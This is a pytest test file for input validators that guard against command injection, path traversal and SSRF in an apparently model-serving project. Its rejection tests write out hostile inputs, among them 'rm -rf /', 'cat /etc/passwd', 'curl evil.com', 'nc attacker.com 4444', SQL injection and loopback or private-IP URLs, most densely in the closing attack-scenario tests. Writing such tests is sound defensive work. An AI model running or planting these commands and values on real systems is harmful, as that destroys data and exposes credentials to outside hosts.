"""Unit tests for security validators.

Tests cover:
- Model name validation (VULN-002: Command Injection)
- Path validation (VULN-005: Path Traversal)
- URL validation (VULN-004: SSRF)
- Command sanitization
- Edge cases and bypass attempts
"""

from pathlib import Path

import pytest
from pydantic import ValidationError

from src.infrastructure.security.validators import (
    ModelNameValidator,
    PathValidator,
    URLValidator,
    sanitize_command_argument,
    validate_model_name,
    validate_path,
    validate_url,
)


class TestModelNameValidator:
    """Tests for model name validation (VULN-002)."""

    def test_valid_simple_model_name(self):
        """Test valid simple model name."""
        validator = ModelNameValidator(name="llama2")
        assert validator.name == "llama2"

    def test_valid_model_with_version(self):
        """Test valid model name with version tag."""
        validator = ModelNameValidator(name="qwen3-coder:30b")
        assert validator.name == "qwen3-coder:30b"

    def test_valid_model_with_namespace(self):
        """Test valid model name with namespace."""
        validator = ModelNameValidator(name="meta-llama/Llama-2-7b-chat-hf")
        assert validator.name == "meta-llama/Llama-2-7b-chat-hf"

    def test_valid_model_with_underscore(self):
        """Test valid model name with underscores."""
        validator = ModelNameValidator(name="my_custom_model_v1")
        assert validator.name == "my_custom_model_v1"

    def test_valid_model_with_dot(self):
        """Test valid model name with dots."""
        validator = ModelNameValidator(name="model.v1.2.3")
        assert validator.name == "model.v1.2.3"

    def test_invalid_shell_metacharacters(self):
        """Test rejection of shell metacharacters."""
        invalid_names = [
            "model;rm",  # Semicolon
            "model|cat",  # Pipe
            "model&background",  # Ampersand
            "model`whoami`",  # Backticks
            "model$var",  # Dollar sign
            "model()",  # Parentheses
        ]
        for name in invalid_names:
            with pytest.raises(ValidationError):
                ModelNameValidator(name=name)

    def test_invalid_path_traversal(self):
        """Test rejection of path traversal attempts."""
        with pytest.raises(ValidationError):
            ModelNameValidator(name="model..escape")

    def test_invalid_redirections(self):
        """Test rejection of shell redirections."""
        invalid_names = ["model>file", "model<file"]
        for name in invalid_names:
            with pytest.raises(ValidationError):
                ModelNameValidator(name=name)

    def test_invalid_whitespace(self):
        """Test rejection of whitespace in model names."""
        invalid_names = [
            "model name",  # Space
            "model\tname",  # Tab
            "model\nname",  # Newline
        ]
        for name in invalid_names:
            with pytest.raises(ValidationError):
                ModelNameValidator(name=name)

    def test_min_length_validation(self):
        """Test minimum length validation."""
        with pytest.raises(ValidationError):
            ModelNameValidator(name="")

    def test_max_length_validation(self):
        """Test maximum length validation."""
        with pytest.raises(ValidationError):
            ModelNameValidator(name="a" * 300)

    def test_convenience_function(self):
        """Test validate_model_name convenience function."""
        result = validate_model_name("llama2-7b")
        assert result == "llama2-7b"

    def test_convenience_function_invalid(self):
        """Test validate_model_name rejects invalid names."""
        with pytest.raises(ValueError):
            validate_model_name("model;rm -rf /")


class TestPathValidator:
    """Tests for path validation (VULN-005)."""

    def test_valid_simple_path(self):
        """Test valid simple path."""
        validator = PathValidator(path="models/llama2.bin")
        assert validator.path == "models/llama2.bin"

    def test_valid_absolute_path(self):
        """Test valid absolute path."""
        validator = PathValidator(path="/data/models/model.bin")
        assert validator.path == "/data/models/model.bin"

    def test_valid_path_with_extension(self):
        """Test valid path with multiple extensions."""
        validator = PathValidator(path="models/model.tar.gz")
        assert validator.path == "models/model.tar.gz"

    def test_invalid_path_traversal_simple(self):
        """Test rejection of simple path traversal."""
        with pytest.raises(ValidationError):
            PathValidator(path="../../../etc/passwd")

    def test_invalid_path_traversal_encoded(self):
        """Test rejection of path traversal with dots."""
        with pytest.raises(ValidationError):
            PathValidator(path="data/../../../secret")

    def test_invalid_null_byte(self):
        """Test rejection of null bytes in path."""
        with pytest.raises(ValidationError):
            PathValidator(path="models/model\0.bin")

    def test_invalid_shell_redirections(self):
        """Test rejection of shell redirections in path."""
        invalid_paths = ["model>file", "model<input", "model|pipe"]
        for path in invalid_paths:
            with pytest.raises(ValidationError):
                PathValidator(path=path)

    def test_path_within_base_dir_valid(self, tmp_path):
        """Test path validation within base directory."""
        base_dir = tmp_path / "models"
        base_dir.mkdir()
        model_file = base_dir / "model.bin"
        model_file.touch()

        validator = PathValidator(path=str(model_file), base_dir=str(base_dir))
        resolved = validator.validate_within_base()
        assert resolved == model_file

    def test_path_outside_base_dir(self, tmp_path):
        """Test rejection of path outside base directory."""
        base_dir = tmp_path / "models"
        base_dir.mkdir()
        outside_file = tmp_path / "secret.txt"
        outside_file.touch()

        validator = PathValidator(path=str(outside_file), base_dir=str(base_dir))

        with pytest.raises(ValueError, match="escapes base directory"):
            validator.validate_within_base()

    def test_path_resolution_symlink_escape(self, tmp_path):
        """Test that symlink escapes are detected."""
        base_dir = tmp_path / "models"
        base_dir.mkdir()
        target_file = tmp_path / "secret.txt"
        target_file.touch()

        # Create symlink inside base_dir pointing outside
        symlink = base_dir / "malicious_link"
        symlink.symlink_to(target_file)

        validator = PathValidator(path=str(symlink), base_dir=str(base_dir))

        # Should detect escape even through symlink
        with pytest.raises(ValueError):
            validator.validate_within_base()

    def test_convenience_function(self, tmp_path):
        """Test validate_path convenience function."""
        test_file = tmp_path / "test.txt"
        test_file.touch()

        result = validate_path(str(test_file))
        assert isinstance(result, Path)

    def test_convenience_function_with_base_dir(self, tmp_path):
        """Test validate_path with base directory restriction."""
        base_dir = tmp_path / "base"
        base_dir.mkdir()
        test_file = base_dir / "test.txt"
        test_file.touch()

        result = validate_path(str(test_file), base_dir=str(base_dir))
        assert result == test_file


class TestURLValidator:
    """Tests for URL validation (VULN-004: SSRF)."""

    def test_valid_https_url(self):
        """Test valid HTTPS URL."""
        validator = URLValidator(url="https://api.example.com/data")
        assert validator.validate_ssrf_protection() == "https://api.example.com/data"

    def test_valid_http_url(self):
        """Test valid HTTP URL."""
        validator = URLValidator(url="http://example.com", allowed_schemes={"http"})
        assert validator.validate_ssrf_protection() == "http://example.com"

    def test_invalid_localhost_ipv4(self):
        """Test rejection of localhost IPv4."""
        validator = URLValidator(url="http://localhost:8080")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_localhost_hostname(self):
        """Test rejection of localhost hostname."""
        validator = URLValidator(url="http://localhost:8000/api")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_127_0_0_1(self):
        """Test rejection of 127.0.0.1 loopback."""
        validator = URLValidator(url="http://127.0.0.1:11434")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_private_ip_10_0_0_0(self):
        """Test rejection of 10.0.0.0/8 private range."""
        validator = URLValidator(url="http://10.0.0.5:8000")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_private_ip_172_16_0_0(self):
        """Test rejection of 172.16.0.0/12 private range."""
        validator = URLValidator(url="http://172.16.0.1")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_private_ip_192_168_0_0(self):
        """Test rejection of 192.168.0.0/16 private range."""
        validator = URLValidator(url="http://192.168.1.1")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_ipv6_loopback(self):
        """Test rejection of IPv6 loopback."""
        validator = URLValidator(url="http://[::1]:8080")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_ipv6_private(self):
        """Test rejection of IPv6 private addresses."""
        validator = URLValidator(url="http://[fc00::1]")
        with pytest.raises(ValueError, match="SSRF protection"):
            validator.validate_ssrf_protection()

    def test_invalid_scheme(self):
        """Test rejection of disallowed schemes."""
        validator = URLValidator(url="file:///etc/passwd", allowed_schemes={"http", "https"})
        with pytest.raises(ValueError, match="scheme"):
            validator.validate_ssrf_protection()

    def test_invalid_scheme_ftp(self):
        """Test rejection of FTP scheme."""
        validator = URLValidator(url="ftp://files.example.com")
        with pytest.raises(ValueError, match="scheme"):
            validator.validate_ssrf_protection()

    def test_domain_whitelist_allowed(self):
        """Test URL within domain whitelist."""
        validator = URLValidator(
            url="https://api.example.com/data",
            allowed_domains={"api.example.com", "web.example.com"},
        )
        assert validator.validate_ssrf_protection() == "https://api.example.com/data"

    def test_domain_whitelist_denied(self):
        """Test URL outside domain whitelist."""
        validator = URLValidator(
            url="https://evil.com/attack", allowed_domains={"api.example.com", "web.example.com"}
        )
        with pytest.raises(ValueError, match="whitelist"):
            validator.validate_ssrf_protection()

    def test_private_ips_allowed_when_enabled(self):
        """Test that private IPs can be allowed when explicitly enabled."""
        validator = URLValidator(url="http://192.168.1.1:8000", allow_private_ips=True)
        # Should not raise
        validator.validate_ssrf_protection()

    def test_null_byte_in_url(self):
        """Test rejection of null bytes in URL."""
        with pytest.raises(ValidationError):
            URLValidator(url="https://example.com/api\0")

    def test_whitespace_in_url(self):
        """Test rejection of whitespace in URL."""
        with pytest.raises(ValidationError):
            URLValidator(url="https://example.com/api path")

    def test_missing_hostname(self):
        """Test rejection of URL without hostname."""
        validator = URLValidator(url="http://")
        with pytest.raises(ValueError, match="hostname"):
            validator.validate_ssrf_protection()

    def test_convenience_function(self):
        """Test validate_url convenience function."""
        result = validate_url("https://api.example.com")
        assert result == "https://api.example.com"

    def test_convenience_function_ssrf_blocked(self):
        """Test validate_url blocks SSRF attempts."""
        with pytest.raises(ValueError, match="SSRF"):
            validate_url("http://localhost:8000")

    def test_convenience_function_with_whitelist(self):
        """Test validate_url with domain whitelist."""
        result = validate_url("https://allowed.com/api", allowed_domains={"allowed.com"})
        assert result == "https://allowed.com/api"

    def test_convenience_function_whitelist_blocked(self):
        """Test validate_url blocks unlisted domains."""
        with pytest.raises(ValueError, match="whitelist"):
            validate_url("https://other.com/api", allowed_domains={"allowed.com"})


class TestSanitizeCommandArgument:
    """Tests for command argument sanitization."""

    def test_sanitize_model_name_valid(self):
        """Test sanitization of valid model name."""
        result = sanitize_command_argument("llama2-7b", "model_name")
        assert result == "llama2-7b"

    def test_sanitize_model_name_invalid(self):
        """Test rejection of invalid model name."""
        with pytest.raises(ValueError):
            sanitize_command_argument("model; rm -rf /", "model_name")

    def test_sanitize_path_valid(self):
        """Test sanitization of valid path."""
        result = sanitize_command_argument("models/model.bin", "path")
        assert result == "models/model.bin"

    def test_sanitize_path_invalid(self):
        """Test rejection of invalid path."""
        with pytest.raises(ValueError):
            sanitize_command_argument("../../../etc/passwd", "path")

    def test_sanitize_string_valid(self):
        """Test sanitization of valid string."""
        result = sanitize_command_argument("hello world", "string")
        assert result == "hello world"

    def test_sanitize_string_with_semicolon(self):
        """Test rejection of string with shell metacharacters."""
        with pytest.raises(ValueError):
            sanitize_command_argument("test;command", "string")

    def test_sanitize_string_with_pipe(self):
        """Test rejection of pipe in string."""
        with pytest.raises(ValueError):
            sanitize_command_argument("test|cat", "string")

    def test_sanitize_string_with_ampersand(self):
        """Test rejection of ampersand in string."""
        with pytest.raises(ValueError):
            sanitize_command_argument("test&bg", "string")

    def test_sanitize_string_with_backtick(self):
        """Test rejection of backticks in string."""
        with pytest.raises(ValueError):
            sanitize_command_argument("test`whoami`", "string")

    def test_sanitize_string_with_dollar(self):
        """Test rejection of variable expansion."""
        with pytest.raises(ValueError):
            sanitize_command_argument("test$var", "string")

    def test_sanitize_string_with_quotes(self):
        """Test rejection of quotes for injection."""
        with pytest.raises(ValueError):
            sanitize_command_argument('test"injected', "string")

    def test_sanitize_string_with_newline(self):
        """Test rejection of newlines."""
        with pytest.raises(ValueError):
            sanitize_command_argument("test\ncommand", "string")


class TestValidatorIntegration:
    """Integration tests for multiple validators together."""

    def test_comprehensive_model_name_validation(self):
        """Test realistic model name validation scenarios."""
        valid_names = [
            "llama2",
            "qwen3-coder:30b",
            "mistral-7b-instruct-v0.2",
            "meta-llama/Llama-2-70b-chat-hf",
            "neural-chat-7b-v3-1",
        ]

        for name in valid_names:
            validate_model_name(name)  # Should not raise

    def test_comprehensive_path_validation(self, tmp_path):
        """Test realistic path validation scenarios."""
        base = tmp_path / "data"
        base.mkdir()

        valid_paths = [
            "models/llama2.bin",
            "dataset/train.json",
            "output/results.csv",
        ]

        for path_str in valid_paths:
            full_path = base / path_str
            full_path.parent.mkdir(parents=True, exist_ok=True)
            full_path.touch()

            validate_path(str(full_path), base_dir=str(base))

    def test_comprehensive_url_validation(self):
        """Test realistic URL validation scenarios."""
        valid_urls = [
            "https://api.openai.com/v1/chat/completions",
            "https://huggingface.co/models",
            "https://github.com/user/repo",
        ]

        for url in valid_urls:
            validate_url(url)  # Should not raise

    def test_attack_scenario_prompt_injection(self):
        """Test common prompt injection in model names."""
        injection_attempts = [
            "model; DROP TABLE models;--",
            "model' OR '1'='1",
            "model`; system('rm -rf /')`,",
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValueError):
                validate_model_name(attempt)

    def test_attack_scenario_path_traversal(self):
        """Test common path traversal attacks."""
        traversal_attempts = [
            "../../secret.key",
            "models/../../../etc/passwd",
            "./../.../../sensitive_data",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(ValueError):
                validate_path(attempt)

    def test_attack_scenario_ssrf(self):
        """Test common SSRF attack patterns."""
        ssrf_attempts = [
            "http://localhost:8000",
            "http://127.0.0.1:5000",
            "http://192.168.1.1:8080",
            "http://10.0.0.1:9000",
            "http://[::1]:8000",
        ]

        for attempt in ssrf_attempts:
            with pytest.raises(ValueError):
                validate_url(attempt)

    def test_attack_scenario_command_injection_subprocess(self):
        """Test command injection via subprocess arguments."""
        injection_attempts = [
            "data.csv; cat /etc/passwd",
            "model.bin && curl evil.com",
            "file.txt | nc attacker.com 4444",
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValueError):
                sanitize_command_argument(attempt, "string")
